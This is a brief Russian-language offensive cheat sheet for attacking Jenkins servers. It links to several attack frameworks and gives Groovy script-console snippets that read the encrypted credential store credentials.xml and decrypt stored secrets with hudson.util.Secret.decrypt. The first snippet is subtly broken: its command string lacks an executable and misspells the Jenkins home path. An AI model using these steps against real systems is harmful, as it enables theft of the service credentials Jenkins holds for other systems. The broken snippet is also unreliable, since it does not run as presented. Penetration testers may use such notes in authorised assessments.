# Jenkins

Jenkins:\
[https://github.com/DolosGroup/Jenkins-Pillage](https://github.com/DolosGroup/Jenkins-Pillage)

PWN:\
[https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)\
[https://github.com/Accenture/jenkins-attack-framework](https://github.com/Accenture/jenkins-attack-framework)

## Примеры

### Консоль

https://host/jenkins/script

#### Получение зашифрованных паролей

Jenkins хранит учетные данные для различных сервисов, указанных по адресу https://host/jenkins/credentials/, а в файловой системе эти учетные данные хранятся в зашифрованном виде в файле /var/jenkins\_home/credentials.xml.

```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = ' /var/jenikins_home/credentials.xml'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

#### Расшифрование паролей

```groovy
println(hudson.util.Secret.decrypt("{AQAA...BBr}"))
```
